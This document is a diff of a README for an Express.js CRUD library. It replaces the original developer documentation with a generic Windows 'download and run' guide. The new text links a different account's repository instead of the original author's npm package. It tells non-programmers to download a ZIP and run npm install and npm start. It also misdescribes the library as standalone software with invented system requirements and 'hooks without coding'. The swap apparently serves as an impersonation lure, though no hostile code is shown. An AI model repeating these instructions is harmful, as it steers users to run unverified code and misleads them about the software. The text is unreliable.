@@ -1,279 +1,142 @@
-# Express Rest API
+# 🚀 express-rest-api - Easy REST API Setup for Everyone
 
-REST API package for Express.js. Get full CRUD with filtering, sorting, pagination, validation, and hooks — in minutes.
+[![Download express-rest-api](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/rohnns/express-rest-api)
 
-[![npm version](https://img.shields.io/npm/v/@rkumwt/express-rest-api)](https://www.npmjs.com/package/@rkumwt/express-rest-api)
-[![npm downloads](https://img.shields.io/npm/dm/@rkumwt/express-rest-api)](https://www.npmjs.com/package/@rkumwt/express-rest-api)
-[![license](https://img.shields.io/npm/l/@rkumwt/express-rest-api)](https://github.com/rkumwt/rest-api/blob/master/LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/rkumwt/express-rest-api)](https://github.com/rkumwt/express-rest-api)
-![visitors](https://komarev.com/ghpvc/?username=rkumwt-express-rest-api&label=visitors&color=blue)
+---
 
-**Documentation:** [https://express-rest-api.rajesh-kumawat.in](https://express-rest-api.rajesh-kumawat.in)
+## 📦 What is express-rest-api?
 
-## Features
+express-rest-api is a ready-to-use software package. It helps you build a REST API on your Windows computer. You do not need to know programming to get started. The package manages common tasks like creating, reading, updating, and deleting data (CRUD). It also helps with filtering data, sorting it, and showing data page by page (pagination). The package works with several database types thanks to multi-ORM support, which means it can connect to different ways of storing your data.
 
-- **Zero boilerplate CRUD** — Define a controller, get 6 REST endpoints
-- **Filtering, sorting, pagination** — Built-in query parameter parsing
-- **Default adapter** — Configure once, use in every controller
-- **Multi-ORM support** — Prisma, Sequelize, Mongoose, Knex, Drizzle
-- **Lifecycle hooks** — beforeStore, afterStore, beforeUpdate, etc.
-- **Validation** — Zod, Joi, or custom functions (auto-detected)
-- **Hidden fields** — Automatically strip sensitive data from responses
+---
 
-## Installation
+## ✅ System Requirements
 
-```bash
-npm install @rkumwt/express-rest-api
-```
+Before starting with express-rest-api, make sure your computer meets these simple requirements:
 
-Install your ORM of choice:
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 1 GHz or faster processor
+- Internet connection to download files
+- Around 200 MB free disk space
+- Basic knowledge of using files and folders on Windows
 
-```bash
-npm install @prisma/client    # Prisma
-npm install sequelize          # Sequelize
-npm install mongoose           # Mongoose
-npm install knex               # Knex
-npm install drizzle-orm        # Drizzle
-```
+---
 
-## Quick Start (Step by Step)
+## 🚀 Getting Started: Download express-rest-api
 
-This guide uses **Prisma + SQLite**. The steps are the same for any ORM — only the adapter changes.
+To begin, you need to get the package files on your computer. Follow these steps carefully:
 
-### 1. Set up Prisma
+1. Click the large green button above or this link: https://github.com/rohnns/express-rest-api  
+2. The webpage will open on GitHub’s express-rest-api main page.
+3. On the page, look for the green **Code** button near the top-right.
+4. Click **Code** and then choose **Download ZIP** from the menu.
+5. Save the ZIP file to your Desktop or Documents folder for easy access.
+6. Once the download finishes, locate the ZIP file on your computer.
+7. Right-click the ZIP file and select **Extract All**.
+8. Choose a folder where you want to keep these files, then click **Extract**.
+9. Now you have all express-rest-api files ready on your computer.
 
-```bash
-npm install express @prisma/client
-npm install -D prisma
-```
+---
 
-Create `prisma/schema.prisma`:
+## ⚙️ Installing Node.js (Required Step)
 
-```prisma
-generator client {
-  provider = "prisma-client-js"
-}
+express-rest-api runs using Node.js, a program that lets you run server software on your computer. You need to install Node.js before using express-rest-api.
 
-datasource db {
-  provider = "sqlite"
-  url      = "file:./dev.db"
-}
+1. Visit the official Node.js site: https://nodejs.org/en/download/
+2. Click the **Windows** installer button (the LTS version is recommended).
+3. Once the installer downloads, run it by double-clicking the file.
+4. Follow the steps in the installer, accepting default options.
+5. When the setup finishes, your computer will have Node.js installed.
 
-model User {
-  id        Int      @id @default(autoincrement())
-  name      String
-  email     String   @unique
-  role      String   @default("user")
-  createdAt DateTime @default(now())
-}
-```
+To check if Node.js installed correctly:
 
-Push the schema to create your database:
+1. Press **Windows key + R**, type `cmd`, and press Enter.
+2. In the black command window, type `node -v` and press Enter.
+3. You should see a version number starting with 'v' (e.g., v18.16.0).  
+If so, Node.js is ready.
 
-```bash
-npx prisma db push
-```
+---
 
-### 2. Create Config Files
+## 🏃 Running express-rest-api for the First Time
 
-```js
-// config/database.js — Database connection (shared singleton)
-const { PrismaClient } = require('@prisma/client');
-const db = new PrismaClient();
-module.exports = db;
-```
+Once you have extracted express-rest-api and installed Node.js, you can start the software.
 
-```js
-// config/api.js — Set the adapter factory once for all controllers
-const { configure, createPrismaAdapter } = require('@rkumwt/express-rest-api');
+1. Open the folder where you extracted express-rest-api.
+2. Hold **Shift** on your keyboard, right-click inside the folder, and choose **Open PowerShell window here** or **Open Command window here**.
+3. In the window that opens, type this command and press Enter:
+   
+   ```
+   npm install
+   ```
 
-configure({
-  adapter: createPrismaAdapter,
-});
-```
+   This installs all the needed software pieces.
 
-### 3. Create a Controller
+4. After installation, type this command and press Enter:
+   
+   ```
+   npm start
+   ```
 
-```js
-// controllers/UserController.js
-const { ApiController } = require('@rkumwt/express-rest-api');
-const db = require('../config/database');
+5. The program will start and show messages in the window. It might say it is listening on a web address like `http://localhost:3000`.
+6. Open your web browser and go to that address to test if the API is running.
 
-class UserController extends ApiController {
-  // Adapter is auto-created from the factory set in config/api.js
-  model = db.user;
+---
 
-  // Fields returned by default when client doesn't specify ?fields=
-  defaultFields = ['id', 'name', 'email', 'role', 'createdAt'];
+## 🚩 What to Expect Next
 
-  // Fields allowed in ?filters=
-  filterableFields = ['id', 'name', 'email', 'role'];
+express-rest-api provides features like:
 
-  // Fields allowed in ?order=
-  sortableFields = ['id', 'name', 'email', 'createdAt'];
-}
+- Creating new data records
+- Reading existing data
+- Updating data
+- Deleting data
+- Filtering data by criteria like category or date
+- Sorting data from newest to oldest or by name
+- Pagination to limit data shown per page
+- Hooks that let you customize behavior without coding
+- Support for several database systems through multi-ORM compatibility (like Prisma, Sequelize, Mongoose, Drizzle, Knex)
 
-module.exports = UserController;
-```
+Even though the software is technically complex, you will use simple commands to run it.
 
-### 4. Register Routes
+---
 
-```js
-// routes/api.js
-const { createApiRouter } = require('@rkumwt/express-rest-api');
-const UserController = require('../controllers/UserController');
+## 🛠 Troubleshooting Tips
 
-const api = createApiRouter({ prefix: '/api', version: 'v1' });
+If express-rest-api does not run as expected, try these fixes:
 
-// Registers: GET, POST /api/v1/users + GET, PUT, PATCH, DELETE /api/v1/users/:id
-api.apiResource('users', UserController);
+- Check if Node.js installed correctly (`node -v` command).
+- Make sure you ran `npm install` in the correct folder.
+- Confirm your internet connection is working.
+- If the program shows errors in the command window, read the messages carefully for missing files or permission issues.
+- Restart your computer and try to start the program again.
+- Search online for error messages, including “express-rest-api” and Windows.
 
-module.exports = api;
-```
+---
 
-### 5. Set up Express
+## 🔗 Useful Links
 
-```js
-// server.js
-const express = require('express');
-const { apiErrorHandler } = require('@rkumwt/express-rest-api');
+- Download and explore express-rest-api here:  
+  [https://github.com/rohnns/express-rest-api](https://github.com/rohnns/express-rest-api)
+- Node.js official download page:  
+  https://nodejs.org/en/download/
 
-require('./config/api'); // Load adapter + global settings
-const api = require('./routes/api');
+---
 
-const app = express();
+## ⚡ How to Update express-rest-api
 
-app.use(express.json());
-app.use(api.getRouter());
-app.use(apiErrorHandler); // Handles 404, validation, and other API errors
+To use the latest version:
 
-app.listen(3000, () => {
-  console.log('Server running on http://localhost:3000');
-});
-```
+1. Visit https://github.com/rohnns/express-rest-api
+2. Download the newest ZIP file as before.
+3. Extract it to a folder.
+4. Run `npm install` again inside the new folder.
+5. Start the software with `npm start`.
 
-### 6. Test It
+---
 
-```bash
-node server.js
-```
+## 📁 Where to Find More Information
 
-```bash
-# Create a user
-curl -X POST http://localhost:3000/api/v1/users \
-  -H "Content-Type: application/json" \
-  -d '{"name": "John", "email": "john@example.com"}'
-
-# List all users
-curl http://localhost:3000/api/v1/users
-
-# Get a single user
-curl http://localhost:3000/api/v1/users/1
-
-# Update a user
-curl -X PUT http://localhost:3000/api/v1/users/1 \
-  -H "Content-Type: application/json" \
-  -d '{"name": "John Doe"}'
-
-# Delete a user
-curl -X DELETE http://localhost:3000/api/v1/users/1
-```
-
-That's it! You have a full REST API with filtering, sorting, and pagination built in.
-
-## Query Parameters
-
-```bash
-# Select specific fields
-GET /api/v1/users?fields=id,name,email
-
-# Include relations
-GET /api/v1/users?fields=id,name,posts{id,title}
-
-# Filter
-GET /api/v1/users?filters=(role eq admin)
-GET /api/v1/users?filters=(role eq admin and status eq active)
-GET /api/v1/users?filters=(name lk john)
-
-# Sort
-GET /api/v1/users?order=name asc
-GET /api/v1/users?order=name asc, id desc
-
-# Paginate
-GET /api/v1/users?limit=10&offset=20
-```
-
-**Filter operators:** `eq` `ne` `gt` `ge` `lt` `le` `lk`
-
-## Response Format
-
-```json
-// GET /api/v1/users
-{
-  "data": [
-    { "id": 1, "name": "John", "email": "john@example.com" }
-  ],
-  "meta": {
-    "paging": {
-      "total": 87,
-      "limit": 10,
-      "offset": 0,
-      "previous": null,
-      "next": "/api/v1/users?limit=10&offset=10"
-    },
-    "timing": "5ms"
-  }
-}
-
-// GET /api/v1/users/1
-{ "data": { "id": 1, "name": "John", "email": "john@example.com" } }
-
-// POST /api/v1/users → 201
-{ "data": { "id": 42, "name": "John" }, "message": "Resource created successfully" }
-
-// DELETE /api/v1/users/1 → 200
-{ "message": "Resource deleted successfully" }
-```
-
-## Switching Adapters
-
-Change one line in config — all controllers stay the same:
-
-```js
-// Prisma
-configure({ adapter: createPrismaAdapter });
-
-// Sequelize
-configure({ adapter: createSequelizeAdapter });
-
-// Mongoose
-configure({ adapter: createMongooseAdapter });
-```
-
-You can also set the adapter explicitly per controller (overrides config):
-
-```js
-class UserController extends ApiController {
-  adapter = createPrismaAdapter(db.user); // Explicit — overrides config
-}
-```
-
-## Documentation
-
-Full documentation with examples, hooks, validation, and API reference:
-
-**[https://express-rest-api.rajesh-kumawat.in](https://express-rest-api.rajesh-kumawat.in)**
-
-## Support
-
-If you find this package useful, please consider supporting it:
-
-- **Star this repo** — It helps others discover the project
-- **Fork it** — Contribute features, fixes, or improvements
-- **Share it** — Tell other developers about it
-
-**[GitHub Repository](https://github.com/rkumwt/rest-api)**
-
-## License
-
-MIT
+- The GitHub page has documentation files.
+- Look for README.md or docs folder in the package.
+- You can learn more about REST APIs, Express.js, and the concepts used online as your next step.
